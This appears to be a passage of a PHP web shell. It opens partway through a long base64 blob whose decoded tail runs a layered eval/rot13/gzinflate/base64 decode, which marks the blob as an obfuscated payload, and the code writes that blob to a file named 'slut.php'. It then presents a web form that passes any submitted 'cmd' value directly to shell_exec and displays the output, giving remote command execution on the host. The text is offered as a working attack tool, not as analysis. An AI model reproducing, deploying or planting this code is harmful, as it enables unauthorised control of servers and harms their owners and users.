ZDNEpXRTZDTzh2MjkrZlFURFlEc291T1o0dXhSUDVTTVFuZ3RhMHhyWUVYVmd2Q29lQVBseWVGQ2tNWDRqYUIvTFZpL0FTRzluWXI2QjBDRSt3NlFkNmxERm14SkFMOGtKdklFR1gyYTFWQXMrdHJiS1hEMVhoaWVJb0ovUXpoOXNsSGxQK0RHT3htbnJlSFhuais2OHNYcUNiOFZ3N3pzRnlHVk55aldnV21scVMxKzFkMngvZlRwdWxLN1ZyLzJEU2xYNjJWLzhRcnc3QlU5S3UxOHA5c2NvSEduNm15VU0rSjNySWt3NWpFT243V3BVazJ1bWtUY3d2QVJIMkdKWkhGOUpTbXFHckVRaHpVeHpnOXRwcE1lMW16U0k1VW5jSHAyVG1vTldJWmhlNmtaa2xqaWRGbEFDR1VQWUNQWEMwVk1zR3JPNkdrZWJxNEJtZUV4bWFJR0dXZUllKy9XaGV4S01tSkl0MkM3YnpuUzBKbHRmM2JGR2lyc08vUkJ4dGkyWlI3dmJCMGw2SFdJaWp3NC9hR0srRnN2RDBHdWhtRDNZU0I5UFRVOWN4NlVBbVl2U1dOSjEvcmQ0cG9ZOGFWVTZ4MEg1a3BjdFlKdEFNMmZ2aVdYSi8vaCthWnN6c3lvSFpNbjNSTkxkMG5uVnBZT3BScXRubDJKRUZMclNiMXlhdlJxajZXUkQzWnlHa3o5aDRFY01xcDBrb0oyS1pqS3RPVnl1bDMwUzRmVldZN2pnYVppenJaTkFjZTgvdCtKNjlKRFYvMytOa1VDdUYzZUt5eW5SWUdOL2R3NzlGS0kyTlZ2d2pwSDRpcmplM0ZDZU5IcGhDb2g0aGhuSHBSelU2NkdGTWExeVpVUEl4SWhGdW1sUmsyMW1nc1RxT3VNdXFISFJsWVdIU2JoWWQrVCt3L2F4bHJPYUtGd05KMXZKOElhQnFlbS92Ri9SOEtxZ0NLTVRpV2xJRlY4WnZYaUlGY2YwWklZdVJUbkcvc2hDMjI1UmF2TlpONjZrNFppMXJaTTZ6MnFkVmVFVWMxQUZ1S1RJQkpiTG9aRVpXNUxRZzhHc0lHNHNLQ1BMRXViMXhqamVmYnE1K1dhMWR2NFVDSHc3dS9oeUl3NHc3YVFLUVNobjZDM0FLT3pucE5rVHJQWWtJQmZ3OTkrTUUxSCtBbTFEUlZHekZIZDlsanVZUDVGTDFCU1hpWjJXNDFJcDhzdGxhVmxBeHFhMy9YM1MwbFBId25SZ2xacEpWeENLc2xKaUZyR3FyNUNVazd6QUJyM1lTZzZ5MzE5QUNiVlNMTTNkdGVEMlBIOXI1bk9ETDRrOThzSWM3TWhhT1RkSFNxVEh1U21nd0hhYmV0ZWhiRHY5YzRQRHJ6T0xVZkx1UENma3VzOHNSK21wYi82NENLZFAreG83WnB4cUk4cHhBVlZFRmRYU0dMNzBzMHU2N3lDSWU2RzFteVZzSVRTNTBWMmQ4V2JJVmtQTUYxdnc1ZHNYZWxNRE1yQXJjL1UyT1R6QXRESkJxR1RnME5HSEtCdm1vVW5rNFpwUm1leGNjM2dUd3U2UWRtbG1CaGRSNFZMTGlPNHpRTDhualFCb0t2RHY1RFlyTXFKVXhvTXl1cU9BVmVuWUhkMVZsdFM2NWl3OUg0RUxTaTYxRjhLYVA1SWhQZjF5ekx4VXBnOUR2eGFDV3JYZ01EaUs5NWZjMlc0bnM2end0VGFCejB2cTdpNHM3QWdtL2lCVlZuWFBDdk9GSHhhRXkrZW1CVTRuaVdYMHJNMDFnOHgzS2NTdTV1Tjd0N21DR2VBbzFaaml1VEk4bEpCTCt2TmtzcERSekZXS1ZyZGhWS2NrWlozL1hpY3RZVUx5VldsamFZcGRMTFJTTExHK2oxcXUzcXpadDNacXN3aXE4VklvbGZhSlhHZytaQlU0Vy85azRxejNrSDVjNFZ4YVM3cmtwTU5uODUyWi9zb3llV3QvbndBUS80TWNlYUEra1o2angrNUFZUjUxaWxwcW40NHlGS2VGdlJlU3ZiN3lHcHNiRFdzUnUrVzVBalNsNlJvQUZxYzNMYlRKL29MMEVZaWsrcmYvSGNtOW90bW5EdlpsbHprVVM3cVFXSjYzb2k5bUkzUE40WkRNZ3BQQmlNd3pMZDlRTmM1a3krR2RxRWh6ZENMZ25vY1RxWkVrczlZdDRDZmxtUjRIQTh3OTJNOFNSOVFkVXZmeGxDbjEvK3NqOGRSbC80ZkYrV3dWOTRPQnZBYnBQdEFCbW9SZ2o4UFdPbitqN2txZkNlMk5kNnRnU2w0UStjVXB0RWhvSnEyekZuUWw0V2E0eFVvOUM3bFZJYk93YXQ2aTFZUVA5TXNvRGp1ckhyN3ZIa3BGUzlhQ2NuNDE3WXlrcnBPa0t5cTYxT1FuNmR2Sk93UCtxZzlSVUsrbUM5d3ZFamt4T1ZvTlJoejhDSVVsZ2JBZGcxSGJFejlVU3dwaXExVlJ3VWp3NXN3OFdtTHN0TllzVkRRM3VDcXpIMFlMU3N6bitya2JRdDI1bXMwKzNJeHpQTDdwZkVkdFJidmJLamV6N1RHekVRREVRanNhRmJYK0FkdXV0RWo4OUc5MTZBRldDQVFGTThCQnFGdWh0Y2o5Ym1MT0wydWRJZUxNRmdnQVVBb3NrQjlhK2VuS2JHZldaVUtLeE1jMXM5VmdpM1lZRHhvYmxOZm81YkkwMHlpb0pmTVpKSzd2ODhXWmptM3ZCcWQ4NG9ZYzcwR21wVm5UUXM0WFUrS1VTOUZTUVNXUUhJNmVjR1ZFaElZRTBwMkdNcUczVnlKQTJWQ2NBL0J2VTIzbDJoSVhYVWFjMnRRM3FDdjV6Ly9OY0FsWXdnQjlZcm96SUxHSGtRU2dCQkxpTFhiTHhVTWZMaXBYaGxWd0hRaFlKS3M4UXVBM0RZV1c5S2hiUVI3S0lTMDMzSXJiSk1XQVhWV1dLRzVrTUtoSlBBdmh5STd0Y1J1Y0R1YVR3Y0RpeExzdUo4YU96QVVabGg1YXp1dk1IbjFkblp1WU8wVXdBb0FqQzJaaENKWjkwRmkyR3pGWnJTVDd4TXNORG53SlBuS21keEdicS9aV09MRmZHR2k5cjNsU2QzQkhMUjVFbDJuSXA3Tzk5c05ReDhiaUt1V0RlVS9KVWlubC9ORmtSSmdwa0xDR2ZENDVEU1BFOHpVY2FRbkF3MmFwZ3pWSzY1bHFvczQwKzM1NHE5UFpmcVJNUHluQ0dsRHI0dG96dnFJNVd4b1Vtb2dYMHlvV0xaT1NtaklBWmhieStSRzFkclpmYVJyTGcxSHR0MHpROUV3Z3pjemNBNDlUQ0pSZFFSdHhrWEhZMGNaTWdRem4zZG12eEQ2MHR1UnkwWnBiaDVLdFh4LzFXeWlDYmYxRHJObkdHTk5EeWN4VlNhcDFITEFSNUdLdXQ1NE1hSk43UHliOFExWDc1U013NmRkbFdVc1V3SFYrRHRHelk1SkZhNkhUNVdJQy9naTRoNkNBTkxqVHYrNUZxQmxveWtvRFlIZmZLYk9tV3F1SlNia1F6blBUVWhJcHFDUUFFak5nSGNMV3hkZTBCTmFtZFFpb1RnRCtaSmFBMm4rKzFGZzhxRFdMUkpqWGp3c3VuUVpOeDRNSUl2Yjk2UjNVUzNqQk5MUzc3TUFXb2JicWFaOUJhcWx3Z0ZZWmtVbll6dVBxeEVtZGg2eEVWeHkyS05WSGg1c1lsV1VMVWpMbkVwRFRTSWsvSVdkRnNjTGZrQlRXci9OT1RiYWRSYjRXMWlnYXgrakViWVo0YTdvdHp3N01VbFA5c0ZWZGRFOVMxNTlQOTRvbjFILzF4NDRwK0laUDAwU1hZOTJvcldqK0RqQjFjU3o2RGRuZHlUMW1sQTVLTnovUW5rNkdLcXNXeWppQjV3ZVRoWml0cXc5Qkd2eFVEeEtJbTZobGJudXBiWkJMUkFXN1hQanppQ2RQWFppUmJ6cENwVytYb2RYY3UvMTlHMXhyejR6U2F3VnVocEJVQjdkYVBkb3RzYWE3eEQ4T0RCNDRPd2Z2QlBQR05VMmpaS09sdW11cmhYeUxITWxCUTZHSVNnbEd3cHhsVHZuU0I2bllyN2lEWnBLdTZoc1RwbzV6TjMxZzRRMURzcHc1RitHUlYwSzQ4OWVKNDZLSlUvNHlxMGZBRGNHSWpUa1dIYWdEMWNXemEyOWNlcFdmeDJUVGVEVUhqUUxaNEIvWWFlU1cwNlJoRzgzcG5CUUtIYWtXTWl2cjAzdVNoWlNEK3VwanliNlI1Q2FzS2Q0T25XWnpjODV1dE1oZWJnUkllejR2Nms4MGJBb29JSGpTZGJLbHRaN1hSTks2NTdCRnZrMDhWZkx3eWh1TWt5TjZEeWxTVUpyZVNObktpUVhzcUZvK0Vxc2x1bGNoNEl5OXc0c2QzV2trcFprY0RpTm00VjNBL09jcnVHN2pGc0hxWW1QbEZTTlBQMStZeDV2SDFBU21WaEYyeXlKS1Nrek1IV2NtZURweFZLVGhYSFpxVTJ4VVNaRittUVBQRDR2bTFhaExzeCs0MGpxMnk4akYzUk43cm5reTRpVUhxQVk1SDVlZTVIYm9vNjNheFFSQVNkSTNhTUUzVFVYTWNicDNwRy9xbEpQbjc4bHdkMWlNaloxSHl6bGlORUxEeUcvNmNweW10NzZEV0E4VlVad3VCRHVTSkd1cUxIOTByR2xEY2ZPSnA1dTNOTnQ2MmgzTFFrbitCcTVUamRBY254OGdYSE5IK2E3VmZKOWk5RzJydmI1bExubndGM3lkNWE5c0hUc0lrY3l0dGIybUd0YmJKV3JUVTNWb0srWkNqUlN2aCtvQmZaVFo0eW8rZ3FINHlDRi80YW4yVjJmMjB0Q0xsK2grZjU0dXFWUDMzWmlyUmVEcWVHM1BRSmErY2NkMi9YdUp1UDUxNjRYZmEySGlGdXFYdnhGaENreWpkbEQvSTNtazJsRzU1eGo0dWx2bHRUcEZFUXZiZThPYzEwZytMbjRVcHlOdk56clQxcTB0bnBtYy9UcFY0WUlqUE9ISHdxUDliMnptajB4eGhXSHNvNXhxWWs1UEZXWTdIeTR6U2VGcVRjbmp4R2kvbklTRXJ6OUdvY092YmhmVkRKMnRyU2FsaDFaQ0htcU5sT1doV09YL1NDc2Z4RmFqZk1aNmNQZGNiU0lwOHpaUVg1am5qYkVNSXJ0L2N0Um5xcldsT1pBdGRYNHM1bGxqazk1R2tDcUpYRW9Ca005UjVYaG9LbDMzQ3g1NkQ5MDhtbDlnZ0ZIZ3R2NnVYZUMxQWNzdXlaRUhQNk5hZkVQUzhlc0ovb3QrMGlUanhzcDd1dWhPS3RwWm1WVC9zYnpJU0JwSkdpNjl3MzJ4ZlRZZGg0MFdNKzVSQmNoaGVmbGxiNHFHemh0eHYvZzg4TDBPRHZkbS9rUFFPUG1CYm41djhJYmVsUGdDZEwyNUpFaXhhSEhhMStjb0lpcWgyaVY5bjhubFpNU0tZOFRrWVhSbHR0UWd6SGpQS2FPbENpODF0RmNrcEJTcUgxMmgwVGpqcm9QQTFsZnVOOTgyVWp4NER0Z3o5NGxKOCtnQTVmaWRHNGpXakg2dmJtenVmWkNGMzN5TkpKaFd1a3J2QmJOQi8zeUU5VzU1Rmhua1ViMVN4NkdkL1RqSzU2SE1xKzZ4aFpXMGRmVW1JSGVSdWhlM21DTk5qK1JnKzhYbWJRbC8vVkhlS1p5NVhBSFFoSTg1cXVqYVFVNHV1aHRDeit2b241OUtUaVZNQWRXSkd6N1dudDlYakc2MGFjNFkwR0ViVWwxeHRzRHdiRm0xWWNVS3liMTkvSi8rbGV5Zlk4R0s5Yk0zTmtwTUkwcXRrNUxCcUJlRzNoRWFqdW1XbnhPMG1ieFpYbEUybHdyYklJbWRoQkhoeXBtZlNiT1FXNzU5OEc4dWNEMkZNcVI0L2xua0dhNVZibUl3YzN0Zzh0VTltUzV3aHBDNzg5TmM5NnhXcjM0RDAvLzB3OFMwYStuUThkRFdjZUcvQUlqOG5FNTQyVTB3Vm85eDVtcmZLbWxXRFRzbkkxMkRTMWdUMXJTQWowdFVRME9YODhCWWZTSkxkWDI5Q1NUNVg3Vk1WbXZOM1BjOWI2TW0zdm5abmFhenhxY1g2Z24zUS8vSUJDdm52ejlmazNyeTZzNnkwRHVpdGN2SDhWTHdZZjR4OThmNlV0cnZFaWM5QXVkRE0rSFBnYkRrYTZRUE9tRy80aCtIY1o5dlUzWS9Ma3I3M0Rnd05ZWFBNWEYyY1ZPdUFtYkFEN29jbHlLaXgrRFRKQnVCZ3p2Y3FHM2x4Z3Y3eW9vVVM5NE9zM1lIYjA0Mm9PMmhEeGlsaVorZVBxenpTVU5POGNhbkk5S011b3h1MVdabzF4SUNybjRDeHA4Sy9DdGJyTkNKcUp4ZzVjUXh1QlFQUmhMNDA3YlMxT1RpNXpJaGlYWE5ZY1FiV2ZML1NmWDVtVGVzVXBLUHppdWpHZWdLa2JBVzR2MHkyR05wQ2hYcE9qOGNmMks0Q3ByamtWOTN6NXVTOXdhdnU3SVI5b3lXQmJ3bVBUM24rOTQybnQvWmM4aW9SUHh6c25XdjdlOHA2MUxTNnVFcG13YmNYN1hXQWxrNUVmYTQwVll0NXRtZFcvK0YxMGpuYmJmTk1aM2svd2c3akV3R3BvZ1dlUVBPYkNBcno4Ni84QSI7DQpldmFsKHN0cl9yb3QxMyhnemluZmxhdGUoc3RyX3JvdDEzKGJhc2U2NF9kZWNvZGUoKCRwYXNpcm1lcmFoKSkpKSkpOw0KPz4=
			';
			$file = fopen("slut.php","w+");
			$write = fwrite ($file ,base64_decode($slut));	


			// cmd 


if(isset($_GET['term'])){
	echo"
<font face='consolas' size='2' color='gold'><center>diskinfo:<br>
[SPACE: <font color=green>$total</font>] - [Free: <font color=lime>$freespace</font>]</center></font>";
	?><p><form  method="POST" action="">
	
	
	<input type="text"  style="background:white;color:black;" size="60" placeholder="zip -r oneenee.zip rootresult;ls -lh" name="cmd">
	<input type="submit" value=">">
</form>


<?php if(isset($_POST['cmd'])){
$data = $_POST['cmd'];
$result = shell_exec($data);
}else{
$result = shell_exec("help");
}
?>
<textarea readonly="" style="background:black;color:gold;margin: 2px; width: 520px; height: 293px;">
<?php echo $result;
}

?>
</textarea>
